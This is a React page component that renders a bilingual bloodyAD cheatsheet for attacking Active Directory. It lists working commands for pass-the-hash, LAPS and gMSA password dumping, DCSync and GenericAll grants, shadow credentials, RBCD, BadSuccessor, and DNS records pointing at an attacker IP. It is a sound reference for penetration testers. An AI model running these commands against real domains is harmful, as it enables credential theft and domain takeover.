"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function BloodyADPage() {
  const { lang } = useLanguage();
  const translateWhy = (text: string) => {
    if (lang === "fr") return text;
    const exact: Record<string, string> = {
      "Installe bloodyAD dans un environnement isolé via pipx (recommandé).":
        "Installs bloodyAD in an isolated pipx environment (recommended).",
      "Installation via APT sur Debian/Ubuntu si le paquet est disponible.":
        "Installs through APT on Debian/Ubuntu if the package is available.",
      "Vérifie l'installation et affiche les commandes disponibles.":
        "Verifies the installation and shows available commands.",
      "Syntaxe générale avec authentification password classique.":
        "General syntax with standard password authentication.",
      "Pass-the-Hash : préfixer le hash avec `:` en guise de mot de passe.":
        "Pass-the-Hash: prefix the hash with `:` as the password value.",
      "Authentification Kerberos (ccache courant). Utiliser le FQDN, pas l'IP.":
        "Kerberos authentication (current ccache). Use the FQDN, not the IP.",
      "Liste tous les comptes utilisateurs du domaine.":
        "Lists all user accounts in the domain.",
      "Récupère tous les attributs LDAP d'un utilisateur spécifique.":
        "Retrieves all LDAP attributes for a specific user.",
      "Lit les flags UAC (ACCOUNTDISABLE, DONT_REQ_PREAUTH, etc.).":
        "Reads UAC flags (`ACCOUNTDISABLE`, `DONT_REQ_PREAUTH`, etc.).",
      "Récupère des attributs précis sur un objet utilisateur.":
        "Retrieves specific attributes from a user object.",
      "Liste tous les groupes du domaine.":
        "Lists all groups in the domain.",
      "Énumère les membres d'un groupe AD.":
        "Enumerates the members of an AD group.",
      "Affiche tous les groupes dont un utilisateur est membre.":
        "Displays all groups where a user is a member.",
      "Liste tous les comptes machine du domaine.":
        "Lists all machine accounts in the domain.",
      "Énumère les relations de confiance inter-domaines.":
        "Enumerates inter-domain trust relationships.",
      "Récupère la politique de mot de passe du domaine.":
        "Retrieves the domain password policy.",
      "Vérifie le quota de comptes machine créables par un utilisateur standard.":
        "Checks how many machine accounts a standard user can create.",
      "Dump l'ensemble des enregistrements DNS du domaine.":
        "Dumps all DNS records from the domain.",
      "Trouve tous les attributs sur lesquels l'utilisateur courant a des droits d'écriture.":
        "Finds all attributes where the current user has write permissions.",
      "Inclut les objets supprimés dans la recherche de droits d'écriture.":
        "Includes deleted objects in write-permission discovery.",
      "Affiche le descripteur de sécurité d'un objet (ACL lisible).":
        "Displays an object's security descriptor (readable ACL).",
      "Trouve les comptes kerberoastables (SPN défini).":
        "Finds kerberoastable accounts (SPN configured).",
      "Trouve les comptes AS-REP roastables (DONT_REQ_PREAUTH activé et compte actif).":
        "Finds AS-REP roastable accounts (`DONT_REQ_PREAUTH` enabled and account active).",
      "Lit le secret géré d'un compte gMSA/dMSA (requiert les droits ACL appropriés).":
        "Reads the managed secret of a gMSA/dMSA account (requires appropriate ACL rights).",
      "Dump les mots de passe LAPS de toutes les machines accessibles.":
        "Dumps LAPS passwords from all accessible machines.",
      "Lit le mot de passe LAPS d'une machine spécifique.":
        "Reads the LAPS password of a specific machine.",
      "Force le changement de mot de passe d'un utilisateur (requiert GenericAll/WriteProp).":
        "Forces a user password change (requires `GenericAll`/`WriteProp`).",
      "Ajoute un utilisateur ou objet dans un groupe AD.":
        "Adds a user or object to an AD group.",
      "Retire un membre d'un groupe AD.":
        "Removes a member from an AD group.",
      "Accorde GenericAll sur un objet cible (contrôle total).":
        "Grants `GenericAll` on a target object (full control).",
      "Change le propriétaire d'un objet AD (permet d'accorder ensuite des droits).":
        "Changes the owner of an AD object (then allows granting rights).",
      "Accorde les droits DCSync (GetChangesAll) à un objet pour extraire les hashes du domaine.":
        "Grants DCSync rights (`GetChangesAll`) to an object to extract domain hashes.",
      "Active AS-REP roasting sur un compte (supprime la pré-authentification Kerberos).":
        "Enables AS-REP roasting on an account (removes Kerberos pre-authentication).",
      "Réactive un compte désactivé.":
        "Re-enables a disabled account.",
      "Active la constrained delegation avec protocol transition (S4U2Self).":
        "Enables constrained delegation with protocol transition (`S4U2Self`).",
      "Injecte des shadow credentials (msDS-KeyCredentialLink) pour obtenir un TGT sans mot de passe.":
        "Injects shadow credentials (`msDS-KeyCredentialLink`) to obtain a TGT without a password.",
      "Assigne un SPN à un compte pour le rendre kerberoastable.":
        "Assigns an SPN to an account to make it kerberoastable.",
      "Configure le RBCD (Resource-Based Constrained Delegation) sur une machine cible.":
        "Configures RBCD (Resource-Based Constrained Delegation) on a target machine.",
      "Crée un compte machine (utile pour RBCD si le quota MachineAccountQuota > 0).":
        "Creates a machine account (useful for RBCD when `MachineAccountQuota > 0`).",
      "Exploite la primitive BadSuccessor via un compte dMSA contrôlé.":
        "Exploits the BadSuccessor primitive through a controlled dMSA account.",
      "Ajoute un enregistrement DNS (utile pour NTLM relay ou coercition).":
        "Adds a DNS record (useful for NTLM relay or coercion).",
      "Supprime un enregistrement DNS précédemment ajouté (nettoyage).":
        "Removes a previously added DNS record (cleanup).",
    };
    return exact[text] ?? "Command purpose available in French only.";
  };
  type CommandItem = {
    cmd: string;
    why: string;
  };

  type CommandSection = {
    title: string;
    groupId?: string;
    commands: CommandItem[];
  };

  const installMethods: CommandSection = {
    title: "Installation",
    commands: [
      {
        cmd: "pipx install git+https://github.com/CravateRouge/bloodyAD",
        why: "Installe bloodyAD dans un environnement isolé via pipx (recommandé).",
      },
      {
        cmd: "sudo apt install bloodyad -y",
        why: "Installation via APT sur Debian/Ubuntu si le paquet est disponible.",
      },
    ],
  };

  const basics: CommandSection = {
    title: "Verify + Syntax",
    commands: [
      { cmd: "bloodyAD --help", why: "Vérifie l'installation et affiche les commandes disponibles." },
      {
        cmd: "bloodyAD --host $DC -d $DOMAIN -u '$USER' -p '$PASS' [command]",
        why: "Syntaxe générale avec authentification password classique.",
      },
      {
        cmd: "bloodyAD --host $DC -d $DOMAIN -u '$USER' -p ':$NTHASH' [command]",
        why: "Pass-the-Hash : préfixer le hash avec `:` en guise de mot de passe.",
      },
      {
        cmd: "bloodyAD --host $DC -d $DOMAIN -k [command]",
        why: "Authentification Kerberos (ccache courant). Utiliser le FQDN, pas l'IP.",
      },
    ],
  };

  const sections: CommandSection[] = [
    // ── Enumeration - Users ───────────────────────────────────────
    {
      title: "Enum - Users",
      groupId: "enum",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get children --otype user",
          why: "Liste tous les comptes utilisateurs du domaine.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$TARGET_USER'",
          why: "Récupère tous les attributs LDAP d'un utilisateur spécifique.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$TARGET_USER' --attr userAccountControl",
          why: "Lit les flags UAC (ACCOUNTDISABLE, DONT_REQ_PREAUTH, etc.).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$TARGET_USER' --attr name,distinguishedName,objectSid",
          why: "Récupère des attributs précis sur un objet utilisateur.",
        },
      ],
    },
    // ── Enumeration - Groups ──────────────────────────────────────
    {
      title: "Enum - Groups",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get children --otype group",
          why: "Liste tous les groupes du domaine.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get membership '$GROUP'",
          why: "Énumère les membres d'un groupe AD.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$USER' --attr memberOf",
          why: "Affiche tous les groupes dont un utilisateur est membre.",
        },
      ],
    },
    // ── Enumeration - Domain ──────────────────────────────────────
    {
      title: "Enum - Domain",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get children --otype computer",
          why: "Liste tous les comptes machine du domaine.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get children --otype trustedDomain",
          why: "Énumère les relations de confiance inter-domaines.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object 'DC=$DOMAIN,DC=$TLD' --attr minPwdLength",
          why: "Récupère la politique de mot de passe du domaine.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object 'DC=$DOMAIN,DC=$TLD' --attr ms-DS-MachineAccountQuota",
          why: "Vérifie le quota de comptes machine créables par un utilisateur standard.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get dnsDump > dns_records.txt",
          why: "Dump l'ensemble des enregistrements DNS du domaine.",
        },
      ],
    },
    // ── ACL & Permissions ─────────────────────────────────────────
    {
      title: "ACL - Enumeration",
      groupId: "acl",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get writable --detail",
          why: "Trouve tous les attributs sur lesquels l'utilisateur courant a des droits d'écriture.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get writable --include-del",
          why: "Inclut les objets supprimés dans la recherche de droits d'écriture.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$TARGET' --attr ntsecuritydescriptor --resolve-sd",
          why: "Affiche le descripteur de sécurité d'un objet (ACL lisible).",
        },
      ],
    },
    // ── Kerberos - Recon ──────────────────────────────────────────
    {
      title: "Kerberos - Recon",
      groupId: "kerberos",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName",
          why: "Trouve les comptes kerberoastables (SPN défini).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName",
          why: "Trouve les comptes AS-REP roastables (DONT_REQ_PREAUTH activé et compte actif).",
        },
      ],
    },
    // ── Credentials ───────────────────────────────────────────────
    {
      title: "Credentials - gMSA / LAPS",
      groupId: "creds",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$GMSA$' --attr msDS-ManagedPassword",
          why: "Lit le secret géré d'un compte gMSA/dMSA (requiert les droits ACL appropriés).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd",
          why: "Dump les mots de passe LAPS de toutes les machines accessibles.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$COMPUTER$' --attr ms-Mcs-AdmPwd",
          why: "Lit le mot de passe LAPS d'une machine spécifique.",
        },
      ],
    },
    // ── Credentials - Password Change ─────────────────────────────
    {
      title: "Credentials - Password",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set password '$TARGET_USER' '$NEW_PASS'",
          why: "Force le changement de mot de passe d'un utilisateur (requiert GenericAll/WriteProp).",
        },
      ],
    },
    // ── Group Membership ──────────────────────────────────────────
    {
      title: "Group - Membership",
      groupId: "group",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember '$GROUP' '$MEMBER'",
          why: "Ajoute un utilisateur ou objet dans un groupe AD.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS delete groupMember '$GROUP' '$MEMBER'",
          why: "Retire un membre d'un groupe AD.",
        },
      ],
    },
    // ── ACL Exploitation ──────────────────────────────────────────
    {
      title: "ACL - Exploitation",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add genericAll '$TARGET' '$ATTACKER_USER'",
          why: "Accorde GenericAll sur un objet cible (contrôle total).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set owner '$TARGET' '$NEW_OWNER'",
          why: "Change le propriétaire d'un objet AD (permet d'accorder ensuite des droits).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add dcsync '$TARGET'",
          why: "Accorde les droits DCSync (GetChangesAll) à un objet pour extraire les hashes du domaine.",
        },
      ],
    },
    // ── UAC Manipulation ─────────────────────────────────────────
    {
      title: "UAC - Manipulation",
      groupId: "uac",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add uac '$TARGET_USER' -f DONT_REQ_PREAUTH",
          why: "Active AS-REP roasting sur un compte (supprime la pré-authentification Kerberos).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS remove uac '$TARGET_USER' -f ACCOUNTDISABLE",
          why: "Réactive un compte désactivé.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add uac '$TARGET' -f TRUSTED_TO_AUTH_FOR_DELEGATION",
          why: "Active la constrained delegation avec protocol transition (S4U2Self).",
        },
      ],
    },
    // ── Kerberos Attacks ──────────────────────────────────────────
    {
      title: "Kerberos - Attacks",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add shadowCredentials '$TARGET'",
          why: "Injecte des shadow credentials (msDS-KeyCredentialLink) pour obtenir un TGT sans mot de passe.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object '$TARGET' servicePrincipalName -v 'cifs/service'",
          why: "Assigne un SPN à un compte pour le rendre kerberoastable.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add rbcd '$DELEGATE_TO$' '$DELEGATE_FROM$'",
          why: "Configure le RBCD (Resource-Based Constrained Delegation) sur une machine cible.",
        },
      ],
    },
    // ── Computer Accounts ─────────────────────────────────────────
    {
      title: "Computer - Accounts",
      groupId: "computer",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add computer '<computer_name>' '<computer_password>'",
          why: "Crée un compte machine (utile pour RBCD si le quota MachineAccountQuota > 0).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add badSuccessor '$ATTACKER_DMSA'",
          why: "Exploite la primitive BadSuccessor via un compte dMSA contrôlé.",
        },
      ],
    },
    // ── DNS ───────────────────────────────────────────────────────
    {
      title: "DNS - Operations",
      groupId: "dns",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add dnsRecord '$RECORD' '$ATTACKER_IP'",
          why: "Ajoute un enregistrement DNS (utile pour NTLM relay ou coercition).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS remove dnsRecord '$RECORD' '<ip>'",
          why: "Supprime un enregistrement DNS précédemment ajouté (nettoyage).",
        },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">
          Cheatsheets
        </p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">
          BloodyAD
        </h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          {lang === "fr"
            ? "Cheatsheet bloodyAD : énumération AD, ACL, Kerberos, credentials et exploitation depuis Linux."
            : "bloodyAD cheatsheet: AD enumeration, ACL, Kerberos, credentials, and Linux-based abuse."}
        </p>
      </header>

      <section id="install" className="mb-6 rounded-sm border border-border p-5">
        <h2 className="mb-3 font-mono text-xs uppercase tracking-widest text-primary">{installMethods.title}</h2>
        <div className="space-y-4">
          {installMethods.commands.map((item) => (
            <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={translateWhy(item.why)} lang={lang} />
          ))}
        </div>
      </section>

      <section id="syntax" className="mb-6 rounded-sm border border-border p-5">
        <h2 className="mb-3 font-mono text-xs uppercase tracking-widest text-primary">{basics.title}</h2>
        <div className="space-y-4">
          {basics.commands.map((item) => (
            <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={translateWhy(item.why)} lang={lang} />
          ))}
        </div>
      </section>

      <section className="space-y-4">
        {sections.map((section) => (
          <article key={section.title} id={section.groupId} className="rounded-sm border border-border p-5">
            <h2 className="font-mono text-xs uppercase tracking-widest text-primary">{section.title}</h2>
            <div className="mt-3 space-y-4">
              {section.commands.map((item) => (
                <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={translateWhy(item.why)} lang={lang} />
              ))}
            </div>
          </article>
        ))}
      </section>
    </div>
  );
}
